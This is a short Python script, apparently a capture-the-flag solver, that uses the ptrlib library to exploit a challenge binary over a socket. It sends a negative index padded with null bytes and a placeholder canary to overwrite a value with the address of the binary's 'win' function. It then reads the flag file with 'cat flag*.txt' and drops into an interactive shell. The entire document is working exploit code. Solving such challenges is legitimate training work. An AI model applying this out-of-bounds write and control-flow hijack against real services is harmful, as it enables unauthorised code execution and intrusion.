from ptrlib import *
import time
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9002"))

elf = ELF("../distfiles/chall")
sock = Socket(HOST, PORT)

payload  = b"-12"
payload += b"\0" * (0x28 - len(payload))
payload += b"AAAAAAAA" # canary
sock.sendlineafter("index: ", payload)
sock.sendlineafter("value: ", int(elf.symbol("win")))

time.sleep(0.5)
sock.sendline("cat flag*.txt")

sock.sh()
